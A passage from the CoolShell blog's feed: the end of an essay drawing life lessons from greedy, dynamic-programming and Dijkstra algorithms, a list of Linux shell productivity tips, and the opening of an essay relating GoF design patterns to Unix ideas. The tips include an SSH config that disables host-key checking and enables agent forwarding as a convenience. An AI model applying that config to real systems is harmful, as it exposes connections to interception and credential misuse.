<ul>
<li>或者我们在过十字路口的时候，要从到对角线的那个街区时，我们也会使用贪婪算法——哪边的绿灯先亮了我们就先过到那边去，然后再转身90度等红灯再过街。</li>
</ul>
<p>这样的例子有很多。对于选择中，大多数人都会选用贪婪算法，因为这是一个比较简单的算法，未来太复杂了，只能走一步看一步，在当前的状况下做出最利于自己的判断和选择即可。</p>
<p>有的人会贪婪薪水，有的人会贪婪做的项目，有的人会贪婪业务，有的人会贪婪职位，有的人会贪婪自己的兴趣……这些都没什么问题。贪婪算法并没有错，虽然不是全局最优解，但其可以让你找到局部最优解或是次优解。其实，有次优解也不错了。<strong>贪婪算法基本上是一种急功近利的算法，但是并不代表这种算法不好，如果贪婪的是一种长远和持续，又未尝不可呢？</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92"></span>动态规划<span class="ez-toc-section-end"></span>
</h4>
<p>但是我们知道，对于大部分的问题，贪婪法通常都不能找出最优解，因为他们一般没有测试所有可能的解。<strong>因为贪婪算法是一种短视的行为，只会跟据当前的形式做判断，也就是过早做决定</strong>，因而没法达到最佳解。</p>
<p>动态规划和贪婪算法的最大不同是，贪婪算法做出选择，不能在过程优化。动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，会动态优化功能。</p>
<p>动态规划算法至少告诉我们两个事：</p>
<p style="padding-left: 30px;">1）<strong>承前启后非常重要，</strong>当你准备去做遍历的时候，你的上次的经历不但能开启你以后的经历，而且还能为后面的经历所用。你的每一步都没有浪费。</p>
<p style="padding-left: 30px;">2）<strong>是否可以回退也很重要</strong>。这意思是——如果你面前有两个选择，一个是A公司一个是B公司，如果今天你选了A公司，并不是你完全放弃了B公司。而是，你知道从A公司退出来去B公司，会比从B公司退出来去A公司要容易一些。</p>
<p>比如说：你有两个offer，一个是Yahoo，一个是Baidu，上述的第一点会让我们思考，我以前的特长和能力更符合Yahoo还是Baidu？而Yahoo和Baidu谁能给我开启更大的平台？上述的第二点告诉我们，是进入Yahoo后如果没有选好，是否还能再选择Baidu公司？还是进入Baidu公司后能容易回退到Yahoo公司？</p>
<h4>
<span class="ez-toc-section" id="Dijkstra%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84"></span><b>Dijkstra</b>最短路径<span class="ez-toc-section-end"></span>
</h4>
<p>最短路径是一个Greedy + DP的算法。相当经典。这个算法的大意如下：</p>
<p style="padding-left: 30px;">1）在初始化的时候，所有的结点都和我是无穷大，默认是达不到的。</p>
<p style="padding-left: 30px;">2）从离自己最近的结点开始贪婪。</p>
<p style="padding-left: 30px;">3）走过去，看看又能到达什么样的结点，计算并更新到所有目标点的距离。</p>
<p style="padding-left: 30px;">4）再贪婪与原点最短的结点，如此反复。</p>
<p>这个算法给我们带来了一些这样的启示：</p>
<ul>
<li>有朋友和我说过他想成为一个架构师，或是某技术领域的专家，并会踏踏实实的向这个目标前进，永不放弃。我还是鼓励了他，但我也告诉他了这个著名的算法，我说，这个算法告诉你，架构师或某领域的专家对你来说目前的距离是无穷大，他们放在心中，先看看你能够得着的东西。<strong>所谓踏实，并不是踏踏实实追求你的目标，而是踏踏实实把你够得着看得见的就在身边的东西干好。</strong>我还记得我刚参加工作，从老家出来的时候，从来没有想过要成为一个技术牛人，也从来没有想过我的博客会那么的有影响力，在做自己力所能及，看得见摸得着的事情，我就看见什么技术就学什么，学着学着就知道怎么学更轻松，怎么学更扎实，这也许就是我的最短路径。</li>
</ul>
<ul>
<li>有很多朋友问我要不要学C++，或是问我学Python还是学Ruby，是不是不用学前端，等等。这些朋友告诉我，他们不可能学习多个语言，学了不用也就忘了，而且术业有专攻。这并没有什么不对的，只是我个人觉得，学习一个东西没有必要只有两种状态，一种是不学，另一种是精通。了解一个技术其实花不了多少时间，我学C++的目的其实是为了更懂Java，学TCP/IP协议其实是为了更懂Socket编程，很多东西都是连通和相辅相成的，学好了C/C++/Unix/TCP等这些基础技术后，我发现到达别的技术路径一下缩短了（这就是为什么<a title="Go 语言简介（下）— 特性" href="https://coolshell.cn/articles/8489.html" target="_blank">我用两天时间就可以了解Go语言的原因</a>）。<strong>这就好像这个算法一样，算法效率不高，也许达到你的目标，你在一开始花了很长时间，遍历了很多地方，但是，这也许这就是你的最短路径（</strong>比起你达不到要好得多<strong>）</strong>。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%AE%97%E6%B3%95%E5%B0%B1%E6%98%AFTrade-Off"></span>算法就是Trade-Off<span class="ez-toc-section-end"></span>
</h4>
<p>你根本没有办法能得到所有你想得到的东西，<strong>任何的选择都意味着放弃</strong>——<strong>当你要去获得一个东西的时候，你总是需要放弃一些东西</strong>。<strong>人生本来就是一个跷跷板，一头上，另一头必然下</strong>。这和我们做软件设计或算法设计一样，用时间换空间，用空间换时间，还有CAP理论，总是有很多的Trade-Off，正如这个短语的原意一样——<strong>你总是要用某种东西去交易某种东西</strong>。</p>
<p>我们都在用某种东西在交易我们的未来，有的人用自己的努力，有的人用自己的思考，有的人用自己的年轻，有的人用自己的自由，有的人用自己的价值观，有的人用自己的道德…… …… 有的人在交换金钱，有的人在交换眼界，有的人在交换经历，有的人在交换地位，有的人在交换能力，有的人在交换自由，有的人在交换兴趣，有的人在交换虚荣心，在交换安逸享乐…… ……</p>
<p><strong>每个人有每个人的算法，每个算法都有每个算法的purpose，就算大家在用同样的算法，但是每个人算法中的那些变量、开关和条件都不一样，得到的结果也不一样。我们就是生活在Matrix里的一段程序，我们每个人的算法决定着我们每个人的选择，我们的选择决定了我们的人生</strong>。</p>
<p style="text-align: center;"><span style="color: #ff0000; font-size: 14px;" data-mce-mark="1"><strong>2012年就要过去了，祝大家新年快乐！</strong></span></p>
<figure id="attachment_8798" aria-describedby="caption-attachment-8798" style="width: 640px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-8798" class="wp-caption-text">插图来自电影 Life of Pi</figcaption></figure>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2012-12-28T09:00:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/8790.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 应该知道的Linux技巧 ]]></title>
<link>https://coolshell.cn/articles/8883.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >这篇文章来源于Quroa的一个问答《<a href="https://www.quora.com/Linux/What-are-some-time-saving-tips-that-every-Linux-user-should-know#" target="_blank">What are some time-saving tips that every Linux user should know?</a>》—— Linux用户有哪些应该知道的提高效率的技巧。我觉得挺好的，总结得比较好，把其转过来，并加了一些自己的理解。 首先，我想告诉大家，<strong>在Unix/Linux下，最有效率技巧的不是操作图形界面，而是命令行操作，因为命令行意味着自动化</strong>。如果你看过《<a title="你可能不知道的Shell" href="https://coolshell.cn/articles/8619.html" target="_blank">你可能不知道的Shell</a>》以及《<a title="28个Unix/Linux的命令行神器" href="https://coolshell.cn/articles/7829.html" target="_blank">28个Unix/Linux的命令行神器</a>》你就会知道Linux有多强大，这个强大完全来自于命令行，于是，就算你不知道怎么去<a title="做个环保主义的程序员" href="https://coolshell.cn/articles/7186.html" target="_blank">做一个环保主义的程序员</a>，至少他们可以让你少熬点夜，从而有利于你的身体健康和性生活。下面是一个有点长的列表，正如作者所说，你并不需要知道所有的这些东西，但是如果你还在很沉重地在使用Linux的话，这些东西都值得你看一看。 （注：如果你想知道下面涉及到的命令的更多的用法，你一定要man一点。对于一些命令，你可以需要先yum或apt-get来安装一下，如果有什么问题，别忘了Google。如果你要Baidu的话，我仅代表这个地球上所有的生物包括微生物甚至细菌病毒和小强BS你到宇宙毁灭）</p>
<h4>基础</h4>
<ul>
<li>
<strong>学习 <a href="https://www.quora.com/Bash-shell" target="_blank">Bash</a> </strong>。你可以man bash来看看bash的东西，并不复杂也并不长。你用别的shell也行，但是bash是很强大的并且也是系统默认的。（学习zsh或tsch只会让你在很多情况下受到限制）</li>
</ul>
<ul>
<li>
<strong>学习 vim</strong> 。在Linux下，基本没有什么可与之竞争的编<del>译</del>辑器（就算你是一个Emacs或Eclipse的重度用户）。你可以看看《<a title="简明 Vim 练级攻略" href="https://coolshell.cn/articles/5426.html" target="_blank">简明vim攻略</a>》和 《<a title="游戏：VIM大冒险" href="https://coolshell.cn/articles/7166.html" target="_blank">Vim的冒险游戏</a>》以及《<a title="给程序员的VIM速查卡" href="https://coolshell.cn/articles/5479.html" target="_blank">给程序员的Vim速查卡</a>》还有《<a title="将vim变得简单:如何在vim中得到你最喜爱的IDE特性" href="https://coolshell.cn/articles/894.html" target="_blank">把Vim变成一个编程的IDE</a>》等等。</li>
</ul>
<ul>
<li>
<strong>了解 ssh</strong>。明白不需要口令的用户认证（通过ssh-agent, ssh-add），学会用ssh翻墙，用scp而不是ftp传文件，等等。你知道吗？scp 远端的时候，你可以按tab键来查看远端的目录和文件（当然，需要无口令的用户认证），这都是bash的功劳。</li>
</ul>
<p><span id="more-8883"></span></p>
<ul>
<li>
<strong>熟悉bash的作业管理</strong>，如： &amp;, Ctrl-Z, Ctrl-C, jobs, fg, bg, kill, 等等。当然，你也要知道Ctrl+\（SIGQUIT）和Ctrl+C （SIGINT）的区别。</li>
</ul>
<ul>
<li>
<strong>简单的文件管理</strong> ： ls 和 ls -l (你最好知道 “ls -l” 的每一列的意思), less, head, tail 和 tail -f, ln 和 ln -s (你知道明白hard link和soft link的不同和优缺点), chown, chmod, du (如果你想看看磁盘的大小 du -sk *), df, mount。当然，原作者忘了find命令。</li>
</ul>
<ul>
<li>
<strong>基础的网络管理</strong>： ip 或 ifconfig, dig。当然，原作者还忘了如netstat, ping, traceroute, 等</li>
</ul>
<ul>
<li>
<strong>理解正则表达式</strong>，还有grep/egrep的各种选项。比如： -o, -A, 和 -B 这些选项是很值得了解的。</li>
</ul>
<ul>
<li>
<strong>学习使用 apt-get 和 yum 来查找和安装软件</strong>（前者的经典分发包是Ubuntu，后者的经典分发包是Redhat），我还建议你试着从源码编译安装软件。</li>
</ul>
<p><b>日常</b></p>
<ul>
<li>在 bash 里，使用 Ctrl-R 而不是上下光标键来查找历史命令。</li>
</ul>
<ul>
<li>在 bash里，使用 Ctrl-W 来删除最后一个单词，使用 Ctrl-U 来删除一行。请man bash后查找Readline Key Bindings一节来看看bash的默认热键，比如：Alt-. 把上一次命令的最后一个参数打出来，而Alt-* 则列出你可以输入的命令。</li>
</ul>
<ul>
<li>回到上一次的工作目录： cd –  （回到home是 cd ~）</li>
</ul>
<ul>
<li>使用 xargs。这是一个很强大的命令。你可以使用-L来限定有多少个命令，也可以用-P来指定并行的进程数。如果你不知道你的命令会变成什么样，你可以使用xargs echo来看看会是什么样。当然， -I{} 也很好用。示例：</li>
</ul>
<blockquote>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">find . -name \*.py | xargs grep some_function

cat hosts | xargs -I{} ssh <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a0d2cfcfd4e0">[email protected]</a>{} hostname</pre>
</blockquote>
<ul>
<li>pstree -p 可以帮你显示进程树。（读过我的那篇《<a title="一个fork的面试题" href="https://coolshell.cn/articles/7965.html" target="_blank">一个fork的面试题</a>》的人应该都不陌生）</li>
</ul>
<ul>
<li>使用 pgrep 和 pkill 来找到或是kill 某个名字的进程。 (-f 选项很有用).</li>
</ul>
<ul>
<li>了解可以发给进程的信号。例如：要挂起一个进程，使用 kill -STOP [pid]. 使用 man 7 signal 来查看各种信号，使用kill -l 来查看数字和信号的对应表</li>
</ul>
<ul>
<li>使用 nohup 或  disown 如果你要让某个进程运行在后台。</li>
</ul>
<ul>
<li>使用netstat -lntp来看看有侦听在网络某端口的进程。当然，也可以使用 lsof。</li>
</ul>
<ul>
<li>在bash的脚本中，你可以使用 set -x 来debug输出。使用 set -e 来当有错误发生的时候abort执行。考虑使用 set -o pipefail 来限制错误。还可以使用trap来截获信号（如截获ctrl+c）。</li>
</ul>
<ul>
<li>在bash 脚本中，subshells (写在圆括号里的) 是一个很方便的方式来组合一些命令。一个常用的例子是临时地到另一个目录中，例如：</li>
</ul>
<blockquote>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW"># do something in current dir
(cd /some/other/dir; other-command)
# continue in original dir</pre>
</blockquote>
<ul>
<li>在 bash 中，注意那里有很多的变量展开。如：检查一个变量是否存在: ${name:?error message}。如果一个bash的脚本需要一个参数，也许就是这样一个表达式 input_file=${1:?usage: $0 input_file}。一个计算表达式： i=$(( (i + 1) % 5 ))。一个序列： {1..10}。 截断一个字符串： ${var%suffix} 和 ${var#prefix}。 示例： if var=foo.pdf, then echo ${var%.pdf}.txt prints “foo.txt”.</li>
</ul>
<ul>
<li>通过 &lt;(some command) 可以把某命令当成一个文件。示例：比较一个本地文件和远程文件 /etc/hosts： diff /etc/hosts &lt;(ssh somehost cat /etc/hosts)</li>
</ul>
<ul>
<li>了解什么叫 “<a href="https://zh.wikipedia.org/wiki/Here%E6%96%87%E6%A1%A3" target="_blank">here documents</a>” ，就是诸如 cat &lt;&lt;EOF 这样的东西。</li>
</ul>
<ul>
<li>在 bash中，使用重定向到标准输出和标准错误。如： some-command &gt;logfile 2&gt;&amp;1。另外，要确认某命令没有把某个打开了的文件句柄重定向给标准输入，最佳实践是加上 “&lt;/dev/null”，把/dev/null重定向到标准输入。</li>
</ul>
<ul>
<li>使用 man ascii 来查看 ASCII 表。</li>
</ul>
<ul>
<li>在远端的 ssh 会话里，使用 screen 或 dtach 来保存你的会话。（参看《<a title="28个Unix/Linux的命令行神器" href="https://coolshell.cn/articles/7829.html" target="_blank">28个Unix/Linux的命令行神器</a>》）</li>
</ul>
<ul>
<li>要来debug Web，试试curl 和 curl -I 或是 wget 。我觉得debug Web的利器是firebug，curl和wget是用来抓网页的，呵呵。</li>
</ul>
<ul>
<li>把 HTML 转成文本： lynx -dump -stdin</li>
</ul>
<ul>
<li>如果你要处理XML，使用 xmlstarlet</li>
</ul>
<ul>
<li>对于 Amazon S3， s3cmd 是一个很方便的命令（还有点不成熟）</li>
</ul>
<ul>
<li>在 ssh中，知道怎么来使用ssh隧道。通过 -L or -D (还有-R) ，翻墙神器。</li>
</ul>
<ul>
<li>你还可以对你的ssh 做点优化。比如，.ssh/config 包含着一些配置：避免链接被丢弃，链接新的host时不需要确认，转发认证，以前使用压缩（如果你要使用scp传文件）：</li>
</ul>
<blockquote>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">TCPKeepAlive=yes
ServerAliveInterval=15
ServerAliveCountMax=6
StrictHostKeyChecking=no
Compression=yes
ForwardAgent=yes</pre>
</blockquote>
<ul>
<li>如果你有输了个命令行，但是你改变注意了，但你又不想删除它，因为你要在历史命令中找到它，但你也不想执行它。那么，你可以按下 Alt-# ，于是这个命令关就被加了一个#字符，于是就被注释掉了。</li>
</ul>
<p><b>数据处理 </b></p>
<ul>
<li>了解 sort 和 uniq 命令 (包括 uniq 的 -u 和 -d 选项).</li>
</ul>
<ul>
<li>了解用 cut, paste, 和 join 命令来操作文本文件。很多人忘了在cut前使用join。</li>
</ul>
<ul>
<li>如果你知道怎么用sort/uniq来做集合交集、并集、差集能很大地促进你的工作效率。假设有两个文本文件a和b已解被 uniq了，那么，用sort/uniq会是最快的方式，无论这两个文件有多大（sort不会被内存所限，你甚至可以使用-T选项，如果你的/tmp目录很小）</li>
</ul>
<blockquote>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">cat a b | sort | uniq &gt; c   # c is a union b 并集

cat a b | sort | uniq -d &gt; c   # c is a intersect b 交集

cat a b b | sort | uniq -u &gt; c   # c is set difference a - b 差集</pre>
</blockquote>
<ul>
<li>了解和字符集相关的命令行工具，包括排序和性能。很多的Linux安装程序都会设置LANG 或是其它和字符集相关的环境变量。这些东西可能会让一些命令（如：sort）的执行性能慢N多倍（注：就算是你用UTF-8编码文本文件，你也可以很安全地使用ASCII来对其排序）。如果你想Disable那个i18n 并使用传统的基于byte的排序方法，那就设置export LC_ALL=C （实际上，你可以把其放在 .bashrc）。如果这设置这个变量，你的sort命令很有可能会是错的。</li>
</ul>
<ul>
<li>了解 awk 和 sed，并用他们来做一些简单的数据修改操作。例如：求第三列的数字之和： awk ‘{ x += $3 } END { print x }’。这可能会比Python快3倍，并比Python的代码少三倍。</li>
</ul>
<ul>
<li>使用 shuf 来打乱一个文件中的行或是选择文件中一个随机的行。</li>
</ul>
<ul>
<li>了解sort命令的选项。了解key是什么（-t和-k）。具体说来，你可以使用-k1,1来对第一列排序，-k1来对全行排序。</li>
</ul>
<ul>
<li>Stable sort (sort -s) 会很有用。例如：如果你要想对两例排序，先是以第二列，然后再以第一列，那么你可以这样： sort -k1,1 | sort -s -k2,2</li>
</ul>
<ul>
<li>我们知道，在bash命令行下，Tab键是用来做目录文件自动完成的事的。但是如果你想输入一个Tab字符（比如：你想在sort -t选项后输入&lt;tab&gt;字符），你可以先按Ctrl-V，然后再按Tab键，就可以输入&lt;tab&gt;字符了。当然，你也可以使用$’\t’。</li>
</ul>
<ul>
<li>如果你想查看二进制文件，你可以使用hd命令（在CentOS下是hexdump命令），如果你想编译二进制文件，你可以使用bvi命令（<a href="http://bvi.sourceforge.net/" target="_blank">http://bvi.sourceforge.net/</a> 墙）</li>
</ul>
<ul>
<li>另外，对于二进制文件，你可以使用strings（配合grep等）来查看二进制中的文本。</li>
</ul>
<ul>
<li>对于文本文件转码，你可以试一下 iconv。或是试试更强的 uconv 命令（这个命令支持更高级的Unicode编码）</li>
</ul>
<ul>
<li>如果你要分隔一个大文件，你可以使用split命令（split by size）和csplit命令（split by a pattern）。</li>
</ul>
<p><b>系统调试</b></p>
<ul>
<li>如果你想知道磁盘、CPU、或网络状态，你可以使用 iostat, netstat, top (或更好的 htop), 还有 dstat 命令。你可以很快地知道你的系统发生了什么事。关于这方面的命令，还有iftop, iotop等（参看《<a title="28个Unix/Linux的命令行神器" href="https://coolshell.cn/articles/7829.html" target="_blank">28个Unix/Linux的命令行神器</a>》）</li>
</ul>
<ul>
<li>要了解内存的状态，你可以使用free和vmstat命令。具体来说，你需要注意 “cached” 的值，这个值是Linux内核占用的内存。还有free的值。</li>
</ul>
<ul>
<li>Java 系统监控有一个小的技巧是，你可以使用kill -3 &lt;pid&gt; 发一个SIGQUIT的信号给JVM，可以把堆栈信息（包括垃圾回收的信息）dump到stderr/logs。</li>
</ul>
<ul>
<li>使用 mtr 会比使用 traceroute 要更容易定位一个网络问题。</li>
</ul>
<ul>
<li>如果你要找到哪个socket或进程在使用网络带宽，你可以使用 iftop 或 nethogs。</li>
</ul>
<ul>
<li>Apache的一个叫 ab 的工具是一个很有用的，用quick-and-dirty的方式来测试网站服务器的性能负载的工作。如果你需要更为复杂的测试，你可以试试 siege。</li>
</ul>
<ul>
<li>如果你要抓网络包的话，试试 wireshark 或 tshark。</li>
</ul>
<ul>
<li>了解 strace 和 ltrace。这两个命令可以让你查看进程的系统调用，这有助于你分析进程的hang在哪了，怎么crash和failed的。你还可以用其来做性能profile，使用 -c 选项，你可以使用-p选项来attach上任意一个进程。</li>
</ul>
<ul>
<li>了解用ldd命令来检查相关的动态链接库。注意：<a title="ldd 的一个安全问题" href="https://coolshell.cn/articles/1626.html" target="_blank">ldd的安全问题</a>
</li>
</ul>
<ul>
<li>使用gdb来调试一个正在运行的进程或分析core dump文件。参看我写的《<a title="GDB中应该知道的几个调试方法" href="https://coolshell.cn/articles/3643.html" target="_blank">GDB中应该知道的几个调试方法</a>》</li>
</ul>
<ul>
<li>学会到 /proc 目录中查看信息。这是一个Linux内核运行时记录的整个操作系统的运行统计和信息，比如： /proc/cpuinfo, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps.</li>
</ul>
<ul>
<li>如果你调试某个东西为什么出错时，sar命令会有用。它可以让你看看 CPU, 内存, 网络, 等的统计信息。</li>
</ul>
<ul>
<li>使用 dmesg 来查看一些硬件或驱动程序的信息或问题。</li>
</ul>
<p>作者最后加了一个免责声明：Disclaimer: Just because you <i>can</i> do something in bash, doesn’t necessarily mean you should. ;) （全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-01-09T08:24:29+08:00</pubDate>
<guid>https://coolshell.cn/articles/8883.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 从面向对象的设计模式看软件设计 ]]></title>
<link>https://coolshell.cn/articles/8961.html</link>
<content><![CDATA[ 
<p>前些天发了一篇《<a title="如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" target="_blank" rel="bookmark">如此理解面向对象编程</a>》的文章，然后引起了大家的热议。然后我在<a href="https://weibo.com/1401880315/z9wWHrrVR" target="_blank">微博上说</a>了一句——“<strong>那23个经典的设计模式和OO半毛钱关系没有，只不过人家用OO来实现罢了……OO的设计模式思想和Unix的设计思想基本没什么差别</strong>”，结果引来了一点点争议。所以，我写下这篇文章把我的观点说明一下。我希望这样可以让大家更容易地理解什么是设计模式。<strong>我顺便帮OO和 Unix/Linux搞搞基</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E5%BC%8F" title="什么是模式">什么是模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#GoF%E7%9A%8423%E4%B8%AA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F" title="GoF的23个设计模式">GoF的23个设计模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%90%8E%E8%AE%B0" title="后记">后记</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%A4%90%E5%90%8E%E7%94%9C%E7%82%B9" title="餐后甜点">餐后甜点</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%86%8D%E9%80%81%E4%B8%80%E4%B8%AA%E6%9E%9C%E7%9B%98" title="再送一个果盘">再送一个果盘</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E5%BC%8F"></span>什么是模式<span class="ez-toc-section-end"></span>
</h4>
<p>在正式说明GoF的那23个经典的设计模式其实和OO关系不大并和Unix的设计思想很相似的这个观点之前，让我先来说说什么是模式？设计模式的英文是Design Pattern，模式是Pattern的汉译。所谓Pattern就是一种规则，或是一种模型，或是一种习惯。Pattern这个东西到处都是，并不只有技术圏子里才有。比如：</p>
<ul>
<li>文章有文章的Pattern。如新闻有新闻的Pattern（第一段话简述了整个新闻），诗歌总是抒情的，论文总是死板的，讲稿总是高谈的，漫画总是幽默的，……</li>
<li>
<span style="line-height: 13px;">小说有小说的Pattern。比如，</span>
<ul>
<li><span style="line-height: 13px;">武侠小说必然要整个武林大会，整几个NB的武功和大师，分个正派和反派，还有一个或数个惊天阴谋，坏人总是要在一开始占尽优势，好人总是要力挽狂澜……</span></li>
<li><span style="line-height: 13px;">言情小说总是要有第三者，总是要有负心人，里面的女子总是要哭得死去活来，但又痴心不改，……</span></li>
</ul>
</li>
<li> 新闻联播的模式是：头10分钟领导很忙，中间10分钟人民很幸福，后10分钟国外很乱。中国政府官方宣传稿也模式也很明显，各种赞美，口号，胜利，总是要坚持个什么，团结个什么，迈向个什么，某某精神，某某思想，群众情绪稳定，不明真相，等等……</li>
<li>春节的模式是，回家，吃饺子，放个鞭炮，给压岁钱，同学聚会…… 同学聚会的模式基本上都是在饭桌上回忆一下校园时光，比较一下各自的当前处境，调戏一下女同学……</li>
<li>…… ……</li>
</ul>
<p>这就是Pattern，只要你细心观察，你会发现这世间有很多很多的Pattern。</p>
<p><span id="more-8961"></span></p>
<h4>
<span class="ez-toc-section" id="GoF%E7%9A%8423%E4%B8%AA%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F"></span>GoF的23个设计模式<span class="ez-toc-section-end"></span>
</h4>
<p>《<a href="http://product.china-pub.com/25961" target="_blank">设计模式</a>》这本书中，GoF这四个人总结了23个经典的面向对象的设计模式，某中有5个创建模式，7个结构模式，11个行为模式。<strong>很多人都会觉得这是面向对象的设计模式，很多人也觉得非面向对象不能用这些模式。我觉得这是一种教条主义。</strong>就像《<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">那些流行的编程方法</a>》中的“设计模式驱动型编程”一样，就像《<a title="如此理解面向对象编程" href="https://coolshell.cn/articles/8745.html" target="_blank">如此理解面向对象</a>》一样的那么的滑稽。</p>
<p>好了，回到我的论点——“<strong>GoF的这23个设计模式和OO关系不大，并且和Unix的设计思想基本一致，只不过GoF用OO实现了它们</strong>”，就像我上面说过的那些生活中的Pattern一样，只要你仔细思考，你会发现这23个设计模式在我们的生活和社会中也能有他们的身影。而且也一样可以用OO的方式实现之。</p>
<p>让我们来看看这23个经典的设计模式中的几个常用的模式：</p>
<p><strong>Factory 模式</strong>，这个模式可能是是个人都知道的模式。这个模式在现实社会中就像各种工厂一样，工厂跨界的不多，基本上都是在生产同一类的产品，有的生产汽车，有的生产电视，有的生产衣服，有的生产卫生纸……基本上来说，一个生产线上只有做同一类的东西。这和Factory模式很相似。编程中，像内存池，线程池，连接池等池化技术都是这个模式，当然，Factory给你的一个对象，而不单单只是资源，factory创建出来的对象都有同样的接口可以被多态调用。<strong>这其实和Unix把所有的硬件都factory成文件一样，并提供了read/write等文件操作来让你操作任意设备的I/O</strong>。</p>
<p><strong>Abstract Factor</strong>y：抽象工厂这个模式是创建一组有同一主题的不同的类。这个模式在现实社会当中也有很多例子，比如：</p>
<ul>
<li>移动公司的合约机计划，88套餐（通话100分钟，短信100条，彩信，20条，上网200M），128套餐（通话200分钟，短信150条，彩信50条，上网500M）……</li>
</ul>
<ul>
<li>家里的装修，总是要有厨卫，有门，有灯，有沙发，有茶几，有床，有衣柜，有电视，有冰箱，有洗衣机……，这些都是必需的，只是每个家庭里的具体装修不一样。</li>
</ul>
<ul>
<li>Diablo游戏中的Normal，Hard，Nightmare，Hell模式，这些模式的怪和场景和故事情况都差不多，就是每个场景的怪物和装备的属性不一样。或是WarCraft中的地图就是一个Abstract Factory模式(注：Warcraft的地图什么都能干)。这和学校中的小学，初中，高中，大学差不多，都是一样的学习环境，一样的教学方式，一样的教室，都要期中考和期末考，都有班长和科代表，就是学的东西的难度不一样，但基本上都是语文，英语，数，理，化，还有永远都有的政治课。学校就是一个抽象工厂。</li>
</ul>
<p>这就是抽象工厂的业务模型（或是：Business Pattern），你觉得是不是不一定非要用OO来实现这样的模式？（我们思考一下，我们会不会被先入为主了，觉得不会OO都不知道怎么实现了），不用OO，用相同格式但内容不同的配置文件是不是也能实现？在Unix下<strong>，抽象工厂这个模式在Unix下就像是/etc/rcX.d下的那些东西，1代表命令行单用户，2，代表命令行多用户，3代表命令行多用户完整模式启动，5代表图形界面启动，0代表关机，6代表重启，你要切换的话，init &lt;X&gt;就行了</strong>。</p>
<p><strong>Prototype模式</strong>，原型模式，复制一个类的实现。这个模式在现实中的例子也有很多：传真，复印，都是这个模式。<strong>Unix进程和Github项目的Fork就是一种。进程fork明显不是OO的模型</strong>（参看：<a title="一个fork的面试题" href="https://coolshell.cn/articles/7965.html" target="_blank">关于Fork的一道面试题</a>）。用非OO的方法同样可以实现这个模式。</p>
<p><strong>Singleton模式</strong>，单例模式。生活中，公司只有一个CEO，法律限制你只能有一个老婆，你只能有一个身份证号，一个TCP端口只能被一个进程使用，等等。软件开发方面，并不一定只有OO才能做到，你可以用一个全局变量，一个中心服务器，甚至可以使用行政手段来约束开发中不会出现多个实例。<strong>Unix下实现单例进程的一个最常用的实践是在进程启动的时候用“(S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)”模式打开一个“锁文件”</strong>。</p>
<p><strong>Adapter模式</strong>，适配器模式。可以兼容欧洲美国中国的插头或插座，万能读卡器，可以播放各种格式多媒体文件的插放器，可以解析FTP/HTTP/HTTPS/等网络协议的浏览器，可以兼容各大银行的银联接口、支付宝、Paypal、VISA等银行接口，可以适配各种后端的解释器的Nginx或Apache，等等。用非OO的编程方式就是重新包装成一个标准接口。<strong>这个模式很像Unix下的/dev下的那些文件，操作系统把系统设备适配成文件，于是你就可以使用read/write来进行读写了</strong>。</p>
